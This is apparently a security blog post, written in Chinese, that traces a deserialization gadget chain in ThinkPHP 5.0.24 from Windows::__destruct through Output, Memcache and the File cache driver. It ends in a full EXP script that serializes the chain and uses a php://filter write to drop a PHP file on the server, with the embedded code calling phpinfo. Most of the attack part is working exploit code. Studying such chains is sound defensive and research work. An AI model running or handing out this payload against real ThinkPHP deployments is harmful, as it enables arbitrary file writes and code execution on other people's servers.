---
title: "PHP反序列化——Thinkphp5.0.24反序列化链构造"
description: "ThinkPHP 5.0.24 反序列化链构造分析。"
publishDate: "2025-09-29T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "thinkphp"]
---
## 反序列化链构造

反序列化起点选择windows类的removefiles()函数

```php
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}
```

调用链路

```php
Windows.php:59, think\process\pipes\Windows->__destruct()
Windows.php:163, think\process\pipes\Windows->removeFiles()
Windows.php:163, file_exists()
Model.php:2267, think\Model->__toString()
Model.php:936, think\Model->toJson()
Model.php:912, think\Model->toArray()
```

此部分和think PHP 5.1.37分析一样

```php
public function toArray()
{
   ……
    // 追加属性（必须定义获取器）
    if (!empty($this->append)) {
        foreach ($this->append as $key => $name) {
            if (is_array($name)) {
                // 追加关联对象属性
                $relation   = $this->getAttr($key);
                $item[$key] = $relation->append($name)->toArray();
            } elseif (strpos($name, '.')) {
                list($key, $attr) = explode('.', $name);
                // 追加关联对象属性
                $relation   = $this->getAttr($key);
                $item[$key] = $relation->append([$attr])->toArray();
            } else {
                $relation = Loader::parseName($name, 1, false);
                if (method_exists($this, $relation)) { //relation为name，可控
                    $modelRelation = $this->$relation();//$this->$relation()要跳转到一个存在getBindAttr方法的对象->HasOne实例化的对象
                    $value         = $this->getRelationData($modelRelation);

                    if (method_exists($modelRelation, 'getBindAttr')) {
                        $bindAttr = $modelRelation->getBindAttr();
                        if ($bindAttr) {
                            foreach ($bindAttr as $key => $attr) {
                                $key = is_numeric($key) ? $attr : $key;
                                if (isset($this->data[$key])) {
                                    throw new Exception('bind attr has exists:' . $key);
                                } else {
                                    $item[$key] = $value ? $value->getAttr($attr) : null;
                                }
                            }
                            continue;
                        }
                    }
                    $item[$name] = $value;
                } else {
                    $item[$name] = $this->getAttr($name);
                }
            }
        }
    }
    return !empty($item) ? $item : [];
}
```

在toArray()函数中，寻找可利用的点：**$this->对象($args)**

```php
 $item[$key] = $value ? $value->getAttr($attr) : null;
```

要让函数控制流走到这一步，需要满足一下条件



```php
if (!empty($this->append))
{
    if(!is_array($name) && !strpos($name, '.')) //$name=$this->append
    {
        $relation = Loader::parseName($name, 1, false);
        if(method_exists($this, $relation)){ //$relation = $name
            $modelRelation = $this->$relation();//$this->$relation()要跳转到一个存在getBindAttr方法的对象->HasOne实例化的对象
            if (method_exists($modelRelation, 'getBindAttr'))//
            {
                $bindAttr = $modelRelation->getBindAttr();
                if ($bindAttr)
                {
                    if (!isset($this->data[$key]))
                    {}
                }
            }
        }    
    }
}
```



```bash
if(method_exists($this, $relation)){ //$relation = $name
            $modelRelation = $this->$relation();
```

$this->$relation()要跳转到一个存在getBindAttr方法的对象->HasOne实例化的对象

搜索满足赋值条件的语句，正则匹&#x914D;**`return \$this->.*`**

```php
public function getError()
{
    return $this->error;
}
```

这里$error可控，接下来选择要跳转到哪个类（满足method\_exists($modelRelation, 'getBindAttr')）

&#x5728;**`thinkphp/library/think/model/relation/OneToOne.php`中找到，**&#x4F46;&#x662F;**`OneToOne`**&#x662F;一个抽象类，要继续寻找其实例化对象。



![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/3f7efb6fa4cbec7a32f678a644e6eb4f.png)

其中BelongsTo以及OneToOne类满足条件，选择HasOne类

返回上面函数控制流，现在要继续使得`$bindAttr = $modelRelation->getBindAttr()`返回值为true，

```php
public function getBindAttr()
{
    return $this->bindAttr;
}
```



这里`$this->bindAttr`是可控的，继续分析

```php
if (!isset($this->data[$key]))
```

`$this->data`默认为空，满足条件，来到了目标位置

```php
$item[$key] = $value ? $value->getAttr($attr) : null;
```



&#x8BA9;**`$value`**&#x4E3A;一个类对象从而实现&#x5411;**`__call`**&#x7684;跳转，分析$value的赋值情况

```bash
$modelRelation = $this->$relation();//HasOne实例化的对象
$value  = $this->getRelationData($modelRelation);
```



```php
* 获取关联模型数据
* @access public
* @param Relation        $modelRelation 模型关联对象
* @return mixed
* @throws BadMethodCallException
*/
protected function getRelationData(Relation $modelRelation) //$modelRelation is HasOne实例化的对象，$modelRelation 必须是 Relation 类的一个实例，或者是 Relation 类的任何一个子类的实例
{
    if ($this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)) {
        $value = $this->parent;
    } else {
        // 首先获取关联数据
        if (method_exists($modelRelation, 'getRelation')) {
            $value = $modelRelation->getRelation();
        } else {
            throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-> getRelation');
        }
    }
    return $value;
}
```



**`$modelRelation`**&#x662F;**`HasOne`**&#x7C7B;示例，*Relation 是  $modelRelation 模型关联对象*

满足if分支的条件是


```php
$this->parent       // 不为空!$modelRelation->isSelfRelation()     // Relation::isSelfRelation返回值为falseget_class($modelRelation->getModel()) == get_class($this->parent))   // Relation::getModel返回值类型和$this->parent相同
```

查看*Relation::isSelfRelation方法*

```php

public function isSelfRelation()
{
    return $this->selfRelation;
}
```

$this->selfRelation可控

查&#x770B;**`Relation::getModel`**&#x65B9;法

```php

public function getModel()
{
    return $this->query->getModel();
}
```

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/737b0925f340fd63089a55acdf899066.png)

调用的是Query类的getModel方法

```php

public function getModel()
{
    return $this->model;
}
```

**`$this->model`**&#x53EF;控，只需要让它&#x548C;**`$this->parent`**&#x7C7B;型相同即可，**`$this->parent`**&#x53C8;&#x548C;**`$value`**&#x76F8;同，故我们先寻&#x627E;**`__call`**&#x65B9;法，选&#x62E9;**`Output`**&#x8FDB;行利用

```php
<?php
namespace think\process\pipes;
use think\model\Pivot;

class Pipes{

}
class Windows extends Pipes{
    private $files = [];
    public function __construct(){
        $this->files = [new Pivot()];

    }

}


namespace think;
use think\model\Pivot;
use think\model\relation\HasOne;

abstract class Model{

    protected $parent;
    // 数据库查询对象
    protected $query;
    // 当前模型名称
    protected $append ;
    protected $error;
//    protected $append = [];
    public function __construct(){
        $this->append = ["getError"];
        $this->error = new HasOne();

    }

}

namespace think\console;
class Output{

}

namespace think\model;
use think\console\Output;
use think\Model;

class Pivot extends Model
{
    public $parent;
    public function __construct()
    {
        parent::__construct();
        $this->parent = new Output();
    }
}

//namespace think\model\relation;
//class HasOne{}



namespace think\model\relation;
use think\db\Connection;
use think\model\Relation;

abstract class OneToOne extends Relation{
    protected $bindAttr = [];
    public function __construct()
    {
        parent::__construct();
        $this->bindAttr = ["seizer", "seizer"];
    }
}

class HasOne extends OneToOne
{
    function __construct()
    {

        parent::__construct();
    }
}


namespace think\model;
use think\db\Query;
use think\model\relation\HasOne;

abstract class Relation
{
//    @TODO parent赋值
//    protected $parent = ;
    protected $query;
    protected $selfRelation ;
    public function __construct(){
        $this->query = new Query();
        $this->selfRelation = false;
    }

}


namespace think\db;
use think\console\Output;
use think\process\pipes\Windows;

class Query
{

    protected $model;
    public function __construct(){
        $this->model = new Output();
    }
}

//namespace think\process\pipes;
//$aaa = new Windows();
//echo base64_encode(serialize($aaa));
```

参数传递分析

```php
if (method_exists($modelRelation, 'getBindAttr')) {
    $bindAttr = $modelRelation->getBindAttr();
    if ($bindAttr) {
        foreach ($bindAttr as $key => $attr) {
            $key = is_numeric($key) ? $attr : $key;
            if (isset($this->data[$key])) {
                throw new Exception('bind attr has exists:' . $key);
            } else {
                $item[$key] = $value ? $value->getAttr($attr) : null;
            }
        }
        continue;
    }
```

$attr=(new HasOne())-> getBindAttr()。





实现跳转\_call函数之后，继续分析

```php
public function __call($method, $args) //$method=getAttr  $args=$this->bindAttr
{
    if (in_array($method, $this->styles)) {
        array_unshift($args, $method); //$args=["getAttr",args[1]……]
        return call_user_func_array([$this, 'block'], $args);
    }

    if ($this->handle && method_exists($this->handle, $method)) {
        return call_user_func_array([$this->handle, $method], $args);
    } else {
        throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
    }
}
```

进入到if分支

```bash
protected function block($style, $message)  //$style = getAttr, $message=$this->bindAttr
{
    $this->writeln("<{$style}>{$message}</$style>");
}
```



```php
public function writeln($messages, $type = self::OUTPUT_NORMAL)
//<{getAttr}>{$this->bindAttr}</getAttr>
{
    $this->write($messages, true, $type);
}
```



```php
public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
{
    $this->handle->write($messages, $newline, $type);
    //$messages=<getAttr>{$this->bindAttr}</getAttr>
}
```

$this->handle属性可控，查找可调用write的类，选择Memcache.php中&#x7684;**`write`**&#x65B9;法





写一下这部分exp

```php
namespace think\console;
use think\session\driver\Memcache;

class Output{
    protected $styles = [];
    private $handle = null;
    public function __construct(){
        $this->styles = [
            'getAttr'
        ];
        $this->handle = new Memcache();

    }
}
```



函数执行流跳转到Memcache类的write函数

```bash
public function write($sessID, $sessData)
//$sessID=<getAttr>{$this->bindAttr}</getAttr>, $sessData=false
{
    return $this->handler->set($this->config['session_name'] . $sessID, $sessData, 0, $this->config['expire']);
    
    
}
```

$this->handler可控，选择那些类可以利用set函数，发现File类存在set函数

写一下这部分的exp

```php
namespace think\session\driver;
use think\cache\driver\File;

class Memcache{
    protected $handler = null;
    public function __construct(){
        $this->handler = new File();
    }
}
```

进入File类中，调用其set函数方法

```php
public function set($name, $value, $expire = null)//$name可控，$value=false  $expire=0
{
    if (is_null($expire)) {
        $expire = $this->options['expire'];
    }
    if ($expire instanceof \DateTime) {
        $expire = $expire->getTimestamp() - time();
    }
    $filename = $this->getCacheKey($name, true);
    if ($this->tag && !is_file($filename)) {
        $first = true;
    }
    $data = serialize($value);
    if ($this->options['data_compress'] && function_exists('gzcompress')) {
        //数据压缩
        $data = gzcompress($data, 3);
    }
    $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
    $result = file_put_contents($filename, $data);
    if ($result) {
        isset($first) && $this->setTagItem($filename);//先判断 isset($first)，如果为 true → 执行 $this->setTagItem($filename)
        clearstatcache();
        return true;
    } else {
        return false;
    }
}
```





```php
protected function getCacheKey($name, $auto = false)
{
    $name = md5($name);
    if ($this->options['cache_subdir']) {//$this->options['cache_subdir']为false
        // 使用子目录
        $name = substr($name, 0, 2) . DS . substr($name, 2);
    }
    if ($this->options['prefix']) {//$this->options['prefix']为false
        $name = $this->options['prefix'] . DS . $name;
    }
    $filename = $this->options['path'] . $name . '.php';
    $dir      = dirname($filename);//返回路径中的目录部分

    if ($auto && !is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    return $filename;
}
```

这里$name可控，所以filename可控



返回到File的set函数，由上可知，filename可控，但是 $data = serialize($value);要经过serialize以及前面exit()函数的添加，使其不可控。所以file\_put\_contents函数没法达到预期效果

继续往下分析，函数控制流进入到setTagItem()，

```php
protected function setTagItem($name)
{
    if ($this->tag) {
        $key       = 'tag_' . md5($this->tag);
        $this->tag = null;
        if ($this->has($key)) {
            $value   = explode(',', $this->get($key));
            $value[] = $name;
            $value   = implode(',', array_unique($value));
        } else {
            $value = $name;
        }
        $this->set($key, $value, 0);
    }
}
```

这里可以控制key和value两个变量，再次进入到set函数,**`$name`**&#x53C2;数还会进&#x5165;**`$this->getCacheKey`**&#x65B9;法，导致该参数也可控，从而使得第二次调&#x7528;**`set`**&#x65F6;，**`file_put_contents`**&#x7684;俩个参数都可控

第一次进入set

```php
&filename=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.phpb35c89c17e1c38df980bd093b91db3aa.php
```



```php
$dir=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/..
```





```php
$data=<?php
//000000000000
 exit();?>
b:1;
```

```php
&filename=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php84701dc92e18913dfccad96f9939203f.php
```

第二次进入set

```php
$this->set($key, $value, 0);
```

```php
&key=tag_c4ca4238a0b923820dcc509a6f75849b,&value=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php84701dc92e18913dfccad96f9939203f.php
```

```php
$filename=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php3b58a9545013e88c7186db11bb158c44.php
&dir=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/..
```

进入$result = file\_put\_contents($filename, $data);

```php
&data=<?php
//000000000000
 exit();?>
s:146:"php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php84701dc92e18913dfccad96f9939203f.php";
```

```php
$filename=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php3b58a9545013e88c7186db11bb158c44.php
```

* resource= 后面的值被当作普通文件路径使用。aaaPD9...== 只是一个目录名，包含的字符（字母、数字、+、=）在 Linux/Windows 的文件名中都是合法的。../ 会抵消前一段：aaaPD9...==/.. 会被路径归一化，等价于“回到上级目录”。操作系统处理路径时把 X/.. 视为返回父目录的语义，不需要 X 实际存在。因此即便 aaaPD9...== 目录并不存在，也不会出错，最终解析到 a.php3b58...。

## EXP

```php
<?php
namespace think\process\pipes;
use think\model\Pivot;

class Pipes{

}
class Windows extends Pipes{
    private $files = [];
    public function __construct(){
        $this->files = [new Pivot()];

    }

}


namespace think;
use think\model\Pivot;
use think\model\relation\HasOne;

abstract class Model{

    protected $parent;
    // 数据库查询对象
    protected $query;
    // 当前模型名称
    protected $append ;
    protected $error;
//    protected $append = [];
    public function __construct(){
        $this->append = ["getError"];
        $this->error = new HasOne();

    }

}
namespace think\cache\driver;
use think\model\Pivot;

class File{
    protected $options = [];

    public function __construct(){
        $this->options = [
            'expire'        => 0,
            'cache_subdir'  => false,
            'prefix'        => '',
            'path'          => "php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php",
            'data_compress' => false,
        ];
        $this->tag = true;
    }


}

namespace think\session\driver;
use think\cache\driver\File;
use SessionHandler;

class Memcache extends SessionHandler {
    protected $handler = null;
    public function __construct(){
        $this->handler = new File();
    }
}



namespace think\console;
use think\session\driver\Memcache;

class Output{
    protected $styles = [];
    private $handle = null;
    public function __construct(){
        $this->styles = [
            'getAttr'
        ];
        $this->handle = new Memcache();

    }
}

namespace think\model;
use think\console\Output;
use think\Model;

class Pivot extends Model
{
    public $parent;
    public function __construct()
    {
        parent::__construct();
        $this->parent = new Output();
    }
}

//namespace think\model\relation;
//class HasOne{}



namespace think\model\relation;
use think\db\Connection;
use think\model\Relation;

abstract class OneToOne extends Relation{
    protected $bindAttr = [];
    public function __construct()
    {
        parent::__construct();
        $this->bindAttr = ["seizer", "seizer"]; //值seizer为_call参数可控
    }
}

class HasOne extends OneToOne
{
    function __construct()
    {

        parent::__construct();
    }
}


namespace think\model;
use think\db\Query;
use think\model\relation\HasOne;

abstract class Relation
{
//    @TODO parent赋值
//    protected $parent = ;
    protected $query;
    protected $selfRelation ;
    public function __construct(){
        $this->query = new Query();
        $this->selfRelation = false;
    }

}


namespace think\db;
use think\console\Output;
use think\process\pipes\Windows;

class Query
{

    protected $model;
    public function __construct(){
        $this->model = new Output();
    }
}




namespace think\process\pipes;
$aaa = new Windows();
echo base64_encode(serialize($aaa));
```





## Reference






